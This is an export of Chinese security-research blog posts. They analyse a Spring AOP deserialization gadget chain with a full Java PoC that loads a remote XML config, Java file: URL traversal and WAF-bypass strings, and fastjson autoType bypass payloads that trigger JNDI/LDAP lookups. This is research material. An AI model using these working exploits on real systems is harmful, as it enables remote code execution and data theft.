[{"content":" 前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操作！膜拜佬！^!\n环境\n正常spring项目再加上下面这个依赖\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjweaver\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 这里其实很奇怪，因为aop中的类需要上面的依赖的类，却还要我们导入这个依赖（应该直接融到spring里的才对\n0x01 简单利用思路 利用点在AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs，通过这里调用任意类的任意(无参|一个参数)方法\n然后继续向上查找调用，只有两处可以传入参数(参数指最后调用的args)，这里我们用的是returnValue\n继续向上找\n最上面会到JdkDynamicAopProxy#invoke，其中会调用proceed()然后再调用上图invoke()\n所以基本利用链就是找个readObject有方法调用的点触发JdkDynamicAopProxy#invoke然后一路到最后的利用invoke，但是调用起来并没有这么顺利\n其实利用路线不止这一条，无参也可以调用TemplatesImpl#newTransformer进行利用\n这里选择有参调用，主要是为了想调用ClassPathXmlApplicationContext，因为是高版本jdk，这里invoke调用有模块检测TemplatesImpl#newTransformer（写了个demo是不行的\n0x02 poc构造 其实这个我不知道怎么说，因为这条链子其实有点绕，我又不想从头开始构造了，那我就按调试过程来描述吧\n调用链\nHashtable#readObject HotSwappableTargetSource#equals Hashtable#equals $Proxy0#get JdkDynamicAopProxy#invoke ReflectiveMethodInvocation#proceed ExposeInvocationInterceptor#invoke --\u0026gt; 设置mi，然后调用proceed() ReflectiveMethodInvocation#proceed AfterReturningAdviceInterceptor#invoke mi.proceed()-\u0026gt;ReflectiveMethodInvocation#invokeJoinpoint 1. 调用map.size()返回1，且不进入后续invokeAdviceMethod 2. 调用map.get()返回\u0026#34;http://127.0.0.1:8888/poc.xml\u0026#34;，一路到invoke AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs DefaultFormatter#stringToValue ClassPathXmlApplicationContext(String...) 1. ExposeInvocationInterceptor 这里需要先添加ExposeInvocationInterceptor再添加我们的目标advice，因为后面调用有个点会找一个值，ExposeInvocationInterceptor#invoke进行设置\n在afterReturning()后续处理，这里会查找mi，不设置这个就是null会报错\n然后这里再回到proceed()方法\n这里get(++index)获取到目标advice进入理想中的流程，这里this.interceptorsAndDynamicMethodMatchers就是JdkDynamicAopProxy的chain，getInterceptorsAndDynamicInterceptionAdvice()会进行正则匹配，匹配成功的advice会add到chain中，没有设置正则其实都会为true进行添加\nList\u0026lt;Object\u0026gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); 2. actualArgs 经过调试发现这个args需要来自前面Object retVal = mi.proceed();\n而retVal这个值来之一个invoke调用的结果\n其中，target我们可以直接设置，method和args则来自proxy触发时的方法和参数，@jsjcw师傅是想到用Map#get来控制这个retVal值\n即我们需要让proxy在反序列化时触发一个get方法，这个在CC中其实利用很多了，这里是选择了Hashtable#equals来触发这个get方法\n3. hash HSTS 但是到Hashtable#equals这步也有技巧，看到这个e.key.equals(key)和上方equals中if (!(o instanceof Map\u0026lt;?, ?\u0026gt; t))（其含义：匹配o是不是Map对象，是的话赋值给t）\n得(key)t=proxy，e.key=Hashtable，但是hash要一样的话需要key=e.key这里显然就矛盾了\n然后这时就想到了(HSTS)HotSwappableTargetSource的hash是固定！且其equals方法正好能满足我们的需求，所以这里套用一层HotSwappableTargetSource\npublic boolean equals(Object other) { return (this == other || (other instanceof HotSwappableTargetSource \u0026amp;\u0026amp; this.target.equals(((HotSwappableTargetSource) other).target))); } 这里本来还有个关于hash进入上图中if的问题，由于HSTS的加入，这个问题也不存在了\n4. size() 构造好上面这些后，发现size()时就会触发proxy，然后到最后利用点，size()返回值为(int)1，最后利用点invoke调用这个参数时会报错中断\n但是我们发现进入最后invoke前会有个类型判断，即type和returnValue的判断，这里type我们可以通过this.discoveredReturningType设置（这个值设置了returningName后面会被覆盖，但是是已经判断完了才覆盖的，所以可以用这个点）\n我们要调用的是ClassPathXmlApplicationContext的自构方法，所以这里type设置为String就行，returnValue为int时就不会进入后续invoke调用了，等map#get获取为我们\u0026quot;http://127.0.0.1:8888/poc.xml\u0026quot;才会进入后续invoke调用\nprivate boolean matchesReturnValue(Class\u0026lt;?\u0026gt; type, Method method, @Nullable Object returnValue) { if (returnValue != null) { return ClassUtils.isAssignableValue(type, returnValue); } 5. newInstance 然后就是利用点的查找，@jsjcw师傅找的是一个jackson依赖的AnnotatedConstructor#call1，但是jackson依赖也需要额外添加，并不是spring自带，像这种依赖需求肯定是越少越好，然后尝试找了下，发现应该是有不少能用的\n我用的是jdk自带的DefaultFormatter#stringToValue\n6. 其他 setFieldValue(aspectJAfterReturningAdvice,\u0026#34;argumentNames\u0026#34;,new String[]{\u0026#34;java.lang.Object\u0026#34;}); setFieldValue(aspectJAfterReturningAdvice,\u0026#34;returningName\u0026#34;,\u0026#34;java.lang.Object\u0026#34;); 然后还有点这个没讲吧，这个是跟actualArgs值获取有关的。这里returningName!=null才会把我们设置的returnValue传入到最后的invoke中去，然后这个值还跟一个报错有关，不设置会报错。\n不出网 @jsjcw师傅还提到用FileCopyUtils的copy方法创建一个本地xml，然后调用这个xml进行命令执行\n其他貌似没啥了\n0x03 poc \u0026amp; 利用链 Hashtable#readObject HotSwappableTargetSource#equals Hashtable#equals $Proxy0#get JdkDynamicAopProxy#invoke ReflectiveMethodInvocation#proceed ExposeInvocationInterceptor#invoke --\u0026gt; 设置mi，然后调用proceed() ReflectiveMethodInvocation#proceed AfterReturningAdviceInterceptor#invoke mi.proceed()-\u0026gt;ReflectiveMethodInvocation#invokeJoinpoint 1. 调用map.size()返回1，且不进入后续invokeAdviceMethod 2. 调用map.get()返回\u0026#34;http://127.0.0.1:8888/poc.xml\u0026#34;，一路到invoke AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs DefaultFormatter#stringToValue ClassPathXmlApplicationContext(String...) import com.fasterxml.jackson.databind.introspect.AnnotatedConstructor; import com.fasterxml.jackson.databind.introspect.AnnotationMap; import com.fasterxml.jackson.databind.introspect.TypeResolutionContext; import com.fasterxml.jackson.databind.type.TypeFactory; import org.springframework.aop.aspectj.AspectJAfterReturningAdvice; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor; import org.springframework.aop.interceptor.ExposeInvocationInterceptor; import org.springframework.aop.target.HotSwappableTargetSource; import org.springframework.context.support.ClassPathXmlApplicationContext; import sun.misc.Unsafe; import javax.swing.text.DefaultFormatter; import java.io.*; import java.lang.reflect.*; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class Mytest2 { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); HashMap\u0026lt;String, String\u0026gt; targetMap = new HashMap\u0026lt;\u0026gt;(); targetMap.put(\u0026#34;argss\u0026#34;, \u0026#34;http://127.0.0.1:8888/poc.xml\u0026#34;); advisedSupport.setTarget(targetMap); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;org.springframework.aop.interceptor.ExposeInvocationInterceptor\u0026#34;); Constructor\u0026lt;?\u0026gt; declaredConstructor = aClass.getDeclaredConstructor(); declaredConstructor.setAccessible(true); ExposeInvocationInterceptor aspectJAroundAdvice0 = (ExposeInvocationInterceptor) declaredConstructor.newInstance(); // AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); // pointcut.setExpression(\u0026#34;.*get\u0026#34;); advisedSupport.addAdvice(aspectJAroundAdvice0); AspectJAfterReturningAdvice aspectJAfterReturningAdvice = getAspectJAfterReturningAdvice(); AfterReturningAdviceInterceptor aspectJAroundAdvice = new AfterReturningAdviceInterceptor(aspectJAfterReturningAdvice); setFieldValue(aspectJAfterReturningAdvice,\u0026#34;argumentNames\u0026#34;,new String[]{\u0026#34;java.lang.Object\u0026#34;}); setFieldValue(aspectJAfterReturningAdvice,\u0026#34;returningName\u0026#34;,\u0026#34;java.lang.Object\u0026#34;); // setFieldValue(aspectJAfterReturningAdvice,\u0026#34;argumentNames\u0026#34;,new String[]{\u0026#34;java.lang.Object\u0026#34;}); // setFieldValue(aspectJAfterReturningAdvice,\u0026#34;throwingName\u0026#34;,\u0026#34;java.lang.Object\u0026#34;); // setFieldValue(aspectJAfterReturningAdvice,\u0026#34;joinPointArgumentIndex\u0026#34;,-1); // setFieldValue(aspectJAfterReturningAdvice,\u0026#34;joinPointStaticPartArgumentIndex\u0026#34;,-1); setFieldValue(aspectJAfterReturningAdvice,\u0026#34;discoveredReturningType\u0026#34;,String.class); advisedSupport.addAdvice(aspectJAroundAdvice); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Map proxyObj = (Map) Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Map.class}, handler); Hashtable htobject = new Hashtable(); htobject.put(\u0026#34;argss\u0026#34;,\u0026#34;test\u0026#34;); HotSwappableTargetSource htkey = new HotSwappableTargetSource(htobject); HotSwappableTargetSource htvalue = new HotSwappableTargetSource(proxyObj); Hashtable hashtable = new Hashtable(); hashtable.put(htkey, \u0026#34;b\u0026#34;); Method addEntry = hashtable.getClass().getDeclaredMethod(\u0026#34;addEntry\u0026#34;, int.class, Object.class, Object.class, int.class); patchModule(Mytest2.class,hashtable.getClass()); addEntry.setAccessible(true); addEntry.invoke(hashtable, 0, htvalue, \u0026#34;2B\u0026#34;, 0); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(hashtable); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\u0026#34;sun.misc.Unsafe\u0026#34;); Field unsafeField = UnsafeClass.getDeclaredField(\u0026#34;theUnsafe\u0026#34;); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\u0026#34;getModule\u0026#34;).invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\u0026#34;module\u0026#34;)); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } private static AspectJAfterReturningAdvice getAspectJAfterReturningAdvice() throws Exception { // Method mapGetMethod = Map.class.getMethod(\u0026#34;get\u0026#34;, Object.class); // AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); //// pointcut.setExpression(\u0026#34;.*get\u0026#34;); // 匹配 Map.get() // Map\u0026lt;String, String\u0026gt; targetMap = new HashMap\u0026lt;\u0026gt;(); // SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(targetMap); // AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice( // mapGetMethod, pointcut, aif // ); // return advice; DefaultFormatter defaultFormatter = new DefaultFormatter(); defaultFormatter.setValueClass(ClassPathXmlApplicationContext.class); Method mapGetMethod = DefaultFormatter.class.getMethod(\u0026#34;stringToValue\u0026#34;, String.class); AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); pointcut.setExpression(\u0026#34;\u0026#34;); SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(defaultFormatter); AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice( mapGetMethod, pointcut, aif ); return advice; // Constructor\u0026lt;ClassPathXmlApplicationContext\u0026gt; declaredConstructor = ClassPathXmlApplicationContext.class.getDeclaredConstructor(String.class); // Object o = newInstanceWithoutConstructor(TypeFactory.class); // TypeResolutionContext ctxt = new TypeResolutionContext.Empty((TypeFactory) o); // // // 3. 创建 AnnotationMap（存储注解信息，这里用空的） // AnnotationMap classAnn = new AnnotationMap(); // AnnotationMap[] paramAnn = new AnnotationMap[0]; // 无参数时用空数组 // // // 4. 初始化 AnnotatedConstructor 对象 // AnnotatedConstructor annotatedConstructor = new AnnotatedConstructor( // ctxt, declaredConstructor, classAnn, paramAnn // ); // Method mapGetMethod = annotatedConstructor.getClass().getMethod(\u0026#34;call1\u0026#34;, Object.class); // AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); // pointcut.setExpression(\u0026#34;\u0026#34;); // SingletonAspectInstanceFactory aif = new SingletonAspectInstanceFactory(annotatedConstructor); // AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice( // mapGetMethod, pointcut, aif // ); // return advice; } public static void setFieldValue(Object obj,String filedName,Object value) throws NoSuchFieldException, IllegalAccessException { Field field = getField(obj.getClass(),filedName); field.setAccessible(true); field.set(obj,value); } public static Field getField(Class clazz,String fieldName) throws NoSuchFieldException { while (true){ Field[] fields = clazz.getDeclaredFields(); for(Field field:fields){ if(field.getName().equals(fieldName)){ return field; } } if(clazz == Object.class){ break; } clazz = clazz.getSuperclass(); } throw new NoSuchFieldException(fieldName); } } 参考\nhttps://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=4848214582444528\u0026group_id=15522421588412\nhttps://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\n","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/%E9%AB%98%E7%89%88%E6%9C%ACjdk-spring-aop%E9%93%BE%E5%AD%90/","summary":"前言：学习@jsjcw师傅在星球发的高版本jdk aop链，感觉会用到就去分析构造了下完整poc，起初以为就是一条平常的链子，实则暗藏了很多操","title":"高版本jdk Spring aop链子"},{"content":" 早期的文章会有些潦草和啰嗦（就当记录那时的我），文章有错误的地方，希望师傅们指出以及多多担待\n邮件：MjY2MTgwODM0NUBxcS5jb20=\n还在登楼，最近状态不太好，想换个环境啦!^!\n喜欢玩CSGO和BB(Battle Brothers)\n","permalink":"https://Jiecub3.github.io/zh/about/","summary":"早期的文章会有些潦草和啰嗦（就当记录那时的我），文章有错误的地方，希望师傅们指出以及多多担待 邮件：MjY2MTgwODM0NUBxcS5jb","title":"About"},{"content":" 前言：起因是记得file协议貌似可以相对路径的，然后想(file://,file://./)列当前目录的，发现不行，当时就以为不能相对路径了。然后file:///C:想列C:下的目录时，却列出了当前路径下的文件列表感觉很神奇，就去研究研究了\nwindow 利用 \\和/不用那么较真，java有转化的\nfile:///C: 列出的是C:\\Users\\jie\\Desktop\\Java\\CVE_learn\\CVE-2022-25845-In-Spring-main的目录文件 file:///C:/ 读取C:下的目录文件 file:///C:test3 读取C:\\Users\\jie\\Desktop\\Java\\CVE_learn\\CVE-2022-25845-In-Spring-main\\test3文件内容 file:///C:../读取当前目录的上层目录 什么原因照成的捏，其实简单的\nURL解析完后，会把解析的path传入new File()初始化\n这里的path和prefixLength则是后面路径解析的关键\n这里神奇吧，为啥这些目录文件就在这File里了？，明明初始化fs调用的那两个函数也没干什么，这里通过getAbsolutePath()获取实际路径（/C:这里可以理解为抽象路径）\nFile file = new File(\u0026#34;/C:\u0026#34;); //这里path会解析成C: ,prefixLength为2 System.out.println(file.getAbsolutePath()); 那看看getAbsolutePath()里是怎么处理的吧，最后在下方这里返回，什么意思呢\npl就是上方的prefixLength（只要是z:xxx这种格式就会返回2，z:xx/会返回3)，getUserPath()获取当前路径，ud就是当前路径最base的路径，然后判断我们的path是不是以ud值开头的，是的话就会把当前路径和我们C:xxx后面的xxx进行拼接返回\n而这里path解析为C:所以这里返回的是当前路径，即\nfile:///C:test3 读取当前目录的test3文件\nfile:///C:../ 列出当前目录的上层目录列表\n利用条件\n但是需要当前目录以X:为开头 且file调用中的C:要和当前目录的most base目录一致 默认只能window利用 为什么捏？\n看到实际路径解析的地方，这里其实只有这3个地方会和当前目录有互动(笔者初心也是为了分析相对路径的)\n第一处后面说，第二处会优先base目录没戏，看到第三处我们当前分析的地方（起始条件是pl为2）\n分析pl即prefixLength\nthis.prefixLength = fs.prefixLength(this.path); 可以看到只有x:开头才能行的通，另一个\\\\开头不行在后续resolve()会直接return path的\n所以这里应该是只能window才能用，毕竟有长度限制，他只判定你前两位字符，本来还想Users:xxx这种在linux尝试的，no！\n然后为什么file:///C:可行，他传到new File()时是/C:，这是因为this.path = fs.normalize(pathname);对路径的转化，这里会把/转化成\\，而/C:xx会转为C:xxx\n看了下fs.normalize()逻辑只有/X:xx这种可以逃脱/的控制！，为什么要逃过/呢，因为只要是/开头resolve()里就和相对路径无缘了，而下面这些传到new File()时都是以/开头的（笔者这里想找linux下可以用的方式）\nfile:///a/../ file://~:80/../ file://localhost:80/a/../ ... linux 探索\u0026amp;利用 即我们需要让URL解析时path不以/开头！，则分析下面这段代码，spec为我们传入的整个url，可以知道识别到path这里时如果是/开头直接g，authority（就是host）不为空的话也会g\n看到这里，file:///xxx常见使用会走这一块，会使authority从null变为\u0026quot;\u0026quot;。导致上图authority!=null成立，所以我们file:///这种格式也别用啦！！！\n后面发现这个authority不影响后续代码，那直接不搞他呗\nfile:./ #成功实现 后续还有个地方，var3就是path，这里的if也不能进，直接给你硬拼两个\\\\（让host为空就能避免了）\n注意这里的替换后面要考！\n继续往下，java这里会判断是否是目录，为目录会list目录列表，文件则读取内容\n这则为file协议的底层逻辑，即java file为什么能列目录\n绕过 也就围绕这些处理路径上的一些转化做文章咯，具体位置就不截图了 麻烦\n绕过file:开头\nurl:file:///xxx 总所周知的，会截取读取url:后面的内容 #在解析协议之前 path=\u0026#34;\tfile:///xxx\t\u0026#34; 会while循环删除首位的空白符号 #在解析协议之前 关键字符绕过\nfile:C|./ 绕过C: #在new File()之前 \\|/ 相互替代,衍生出.\\../.\\..\\../ 这个在new File()里面也有转化 url加密 ParseUtil.decode()会进行url解密 #在new File()之前 path=\u0026#34; file:%2e%2f%2e%2e%2f%2e%2e%2f \u0026#34; path=\u0026#34; netdoc:%2e%2f%2e%2e%2f%2e%2e%2f \u0026#34; netdoc平替 file 但是jdk11后删除了 url绕过\nif (spec.regionMatches(true, start, \u0026#34;url:\u0026#34;, 0, 4)) { start += 4; } 因为这个比对会大小写都比对，所以url:可以大小写混着写Url:。然后这里toUpperCase()也存在转化问题，但是我跑了下，没找到url:这几个可以利用的字符\nfile绕过\nurl协议处理的时候也会toLowerCase()转化，所以这里file也可以大小写，但是有个巨神奇的地方。这里不是有i字符么。\nSystem.out.println(Character.toLowerCase(\u0026#39;İ\u0026#39;)==\u0026#39;i\u0026#39;); //true 上面这个是我之前跑过的。但是这里利用不了\n这里可以发现İ被转成了2位字符！ 然后我又去跑了下uincode字符。（想找能toLowerCase()解析成2位可用的字符)，发现只有İ是这样本身len为1 解析 后len为2\n\u0026#34;İ\u0026#34;.toLowerCase().length() //2 总结 file:path 貌似就是这样设计的，但是在网上找利用的时候没看到有写的。那么研究这个有什么用捏，感觉鸡肋呀hhh\n也是file:///C:出乎我意外的回显，就好奇去看了看吧\n感觉绕过可能稍稍微有那么一点点用？\nfile:path这种应该是有用的（测试雷池waf个人版）这种形式都不会记录的\n之前阿里云waf会检查3个../../../这种，用上面应该也能绕过\n可是我觉得能最有用的应该是绕过..这种检查，可以二次url加密，到java代码层都是一层url加密的，而很多业务应该是直接检测..的嘿嘿\n但还是鸡肋只能应用于file协议下。并不能做到路径拼接下的..绕过\npath=\u0026quot; Url:FiLe:%2e%2f%2e%2e%2f%2e%2e%2f \u0026quot;\n","permalink":"https://Jiecub3.github.io/zh/posts/java/%E5%8E%9F%E7%94%9Fjdk/java-file%E5%8D%8F%E8%AE%AE-%E7%AE%80%E6%9E%90/","summary":"前言：起因是记得file协议貌似可以相对路径的，然后想(file://,file://./)列当前目录的，发现不行，当时就以为不能相对路径了","title":"java file协议 简析"},{"content":" 做个总结，忘了捡得快\n1.2.24~1.2.47 1.2.24-1.2.47（绕过黑名单的poc 都需开启autoTypeSupport 用于返回class，关闭throw\n1.2.24 两个常用poc，无过滤\nTemplatesImpl 反序列化\nJdbcRowSetImpl 反序列化\n1.2.25~1.2.41 增加了黑/白名单检测，但是再最后loadClass()时，会对我们传入的class进行L和;的截取再加载class （Lxxx;-\u0026gt;xxx）\n导致可以通过L;绕过前面的黑名单检测，最后加载时再截取及可以加载我们想要的class，从而绕过黑名单\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\u0026#34;@type\u0026#34;:\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap://127.0.0.1:1389/g0tvin\u0026#34;,\u0026#34;autoCommit\u0026#34;:true} 1.2.42 在checkAutoType最开始时及会对class进行一次L;的截取，然后进行黑名单检测再loadClass()，但是这个截取只会进行一次，所以可以双写L;进行绕过，LLxxx;;\n// poc ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\u0026#34;@type\u0026#34;:\u0026#34;LLcom.sun.rowset.JdbcRowSetImpl;;\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap://127.0.0.1:1389/g0tvin\u0026#34;,\u0026#34;autoCommit\u0026#34;:true} 1.2.43 在此版本中,checkAutoType对LL进行了判断，如果类以LL开头，则直接抛出异常\n但是在loadClass()中除了L;的截取，会有对[开头的截取，所以我们用[进行绕过，但是直接用会存在报错，根据报错填上对应字符{即可\n// poc ParserConfig.getGlobalInstance().setAutoTypeSupport(true); //开启autoTypeSupport {\u0026#34;@type\u0026#34;:\u0026#34;[com.sun.rowset.JdbcRowSetImpl\u0026#34;[{,\u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap://127.0.0.1:1389/g0tvin\u0026#34;,\u0026#34;autoCommit\u0026#34;:true} 1.2.44\n修复了[的绕过，在checkAutoType中进行判断如果类名以[开始则直接抛出异常 \u0026lt;1.2.47(通杀!!!) 无需开启autoTypeSupport\n简述：通过Class.class对应的deserializer反序列化，实现恶意class的加载和map存储，然后再通过@type触发，从map中获取存储的class完成恶意class的获取，这个过程完全避免了autoType的黑白名单检测\n{ \u0026#34;1\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;java.lang.Class\u0026#34;, \u0026#34;val\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34; }, \u0026#34;2\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;: \u0026#34;ldap://127.0.0.1:1389/g0tvin\u0026#34;, \u0026#34;autoCommit\u0026#34;: true } } 初始化时会给deserializers存入一些类型\n所下面这里会找到Class.class\n然后return class，再对对应的deserializer进行反序列化\n而deserialze()中会对val设置的值进行loadClass()\n并且加载成功会将其put到mappings中（cache默认就是true）,没错这里mappings就是getClassFromMapping()中获取的map，所以我们只需要再@type调用jdbc即可（这里因为是没开启autoTypeSupport，所以不会进入第一个for黑白名单检测，而通过getClassFromMapping()获取到class后，有if判断进行return class，不再进行后续代码，及实现了没有黑名单检测）\npublic static Class\u0026lt;?\u0026gt; getClassFromMapping(String className) { return (Class)mappings.get(className); } 1.2.48~1.2.68 1.2.48\n在MiscCodec中修改了cache的默认值，修改为false，并且对TypeUtils.loadClass中的mapping.put做了限制 在此版本中新增了一个safeMode功能，如果开启的话，将会直接抛出异常，完全杜绝了autoTypeSupport的绕过\n这里还存在一些黑名单绕过（需要开启autoTypeSupport\nhttps://www.anquanke.com/post/id/232774#h3-18\n1.2.67分析一条链子 https://www.anquanke.com/post/id/232774#h3-16\norg.apache.shiro.jndi.JndiObjectFactory 绕过黑名单 需要开启AutoTypeSupport（不然没地方加载class）\nParserConfig.getGlobalInstance().setAutoTypeSupport(true); String a67=\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;org.apache.shiro.jndi.JndiObjectFactory\\\u0026#34;,\\\u0026#34;resourceName\\\u0026#34;:\\\u0026#34;ldap://localhost:1389/Exploit\\\u0026#34;,\\\u0026#34;instance\\\u0026#34;:{\\\u0026#34;$ref\\\u0026#34;:\\\u0026#34;$.instance\\\u0026#34;}}\u0026#34;; JSON.parse(a67); 这里通过setResourceName设置jndi恶意vps，然后getInstance触发jndi请求\n\u0026quot;instance\u0026quot;:{}这里不能这样使用，因为public T getInstance() {返回值类型不继承自Collection.class Map AtomicBoolean AtomicInteger AtomicLong 这里T调试类型是java.lang.Object\n但是可以通$ref来触发，那么看看$ref是怎么处理的\n循环引用 $ref https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8\n语法 描述 {\u0026quot;$ref\u0026quot;:\u0026quot;$\u0026quot;} 引用根对象 {\u0026quot;$ref\u0026quot;:\u0026quot;@\u0026quot;} 引用自己 {\u0026quot;$ref\u0026quot;:\u0026quot;..\u0026quot;} 引用父对象 {\u0026quot;$ref\u0026quot;:\u0026quot;../..\u0026quot;} 引用父对象的父对象 {\u0026quot;$ref\u0026quot;:\u0026quot;$.members[0].reportTo\u0026quot;} 基于路径的引用 $ref在反序列化json时，会进行一些初始化设置值，便于后续调用\nvalue是反序列化完的对象，然后handleResovleTask进行ref的调用\n调用前，还会初始化一些fieldInfo，使一些本来不能调用方法，可以调用，比如这里是通过computeGetters初始getter方法的。但是这里就不限制返回值了，所以getInstance得以被添加\n这里满足长度\u0026gt;=4,第四位数为大写基本上就可以添加到filedInfo里面了\n\u0026#34;instance\u0026#34;:{\u0026#34;$ref\u0026#34;:\u0026#34;$.instance\u0026#34;} 然后再通过$ref去获取{}(整个对象)下\u0026quot;instance\u0026quot;，从而触发获取对象的instance属性，及调用fieldInfo中对应的getter方法，获取instance值，触发getInstance得以利用\n\u0026lt;1.2.68(expectClass 在不开启autoTypeSupport的情况下，还有一个点可以利用expectClass，加载恶意class后满足下面两个条件就能返回class\n传入expectClass不为null 恶意class继承expectClass 正常即使绕过黑名单也需要开启autoTypeSupport，保证class的返回\n具体利用查找 而正常调用，我们的expectClass都是null，所以我们可以查找checkAutoType其他地方的调用\nclazz = config.checkAutoType(typeName, null, lexer.getFeatures()); 发现有2处，且都是反序列化的时候调用，分别是JavaBeanDeserializer，ThrowableDeserializer\n及我们需要取看怎么获取这两个serializer，那就是去分析getDeserializer()呗，我们的expectClass不属于上面类时会进入到createJavaBeanDeserializer()，同时看到上方else if，expectClass继承与Throwable.class即可返回ThrowableDeserializer反序列化器\nelse if (Throwable.class.isAssignableFrom(clazz)) { derializer = new ThrowableDeserializer(this, clazz); 可以看到经过createJavaBeanDeserializer()一系列处理后，可以返回JavaBeanDeserializer反序列化器，后续则会调用\n然后这里json指针继续向后读取，key为@type时进入if，并读取值作为typeName传入config.checkAutoType(typeName, expectClass, lexer.getFeatures())；\n到这里就完成了expectClass的传入了，然后想要完成return只需要，继承于expectClass，且不是黑名单即可\nexpectClass查找 上面分析，我们知道怎么利用这个expectClass来加载我们恶意class了，但是还需要找到一个expectClass来return 自己的class，并进入到createJavaBeanDeserializer()\n无autoTypeSupport 首先无autoTypeSupport 完成 return class，及分析checkAutoType()逻辑\n可以看到无autoTypeSupport和expectClass，会先在mappings和deserializers查找然后返回class\nclazz = TypeUtils.getClassFromMapping(typeName); clazz = deserializers.findClass(typeName); 继续往下到第二次黑/白名单检测，使得autoTypeSupport为false也会进行waf检测，但是可以发现是白名单的话则会直接loadclass并返回class\n然后继续往下就还有最后一处，继承于JSONType.class也会return class\nif (clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } 补充，高版本才有internalWhite，有个白名单，属于白名单的会加载，然后后面代码会return class\nif (internalWhite) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true); } return 小结 总结下无autoTypeSupport可以return class的点\nMappings，deserializers\nTypeUtils.getClassFromMapping(typeName); clazz = deserializers.findClass(typeName); checkAutoType里白名单（默认为空\n继承JSONType.class\ninternalWhite 白名单\n怎么找 然后要找JavaBeanDeserializer的话，deserializers就可以排除了，因为他init没有put对应的JavaBeanDeserializer（ThrowableDeserializer有\nmappings在addBaseClassMappings()进行初始化，可以更直观看到哪些class可以利用\n然后看到Object.class这不是随便利用？（1.2.42前面看的代码逻辑）\n然后看了下1.2.67做了一些限制，expectClass不能是下方这些类，不然expectClassFlag = false;-\u0026gt;不能加载和返回class（这样处理也是为了限制利用范围，因为下方继承类很多\nObject.class Serializable.class Cloneable.class Closeable.class EventListener.class Iterable.class Collection.class 然后1.2.67代码上相对于之前版本，并不会都进行loadClass()了，改为下方这种方式\nif (autoTypeSupport || jsonType || expectClassFlag) { //jsonType 就是继承JSONType.class boolean cacheClass = autoTypeSupport || jsonType; clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); } 也就是从mappings和JSONType.class以及internalWhite 里找 expectClass\nEvil继承AutoCloseable就行\nString obj=\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.AutoCloseable\\\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Evil\\\u0026#34;,\\\u0026#34;cmd\\\u0026#34;:\\\u0026#34;calc\\\u0026#34;}}\u0026#34;; JSON.parseObject(obj); jdbc gadgets\n1.2.68小结 恶意类不在黑名单内 恶意类的父类（exceptClass例如AutoCloseable）不在黑名单内 且 要能本身能return class 并能获取JavaBeanDeserializerorThrowableDeserializer反序列化加载器 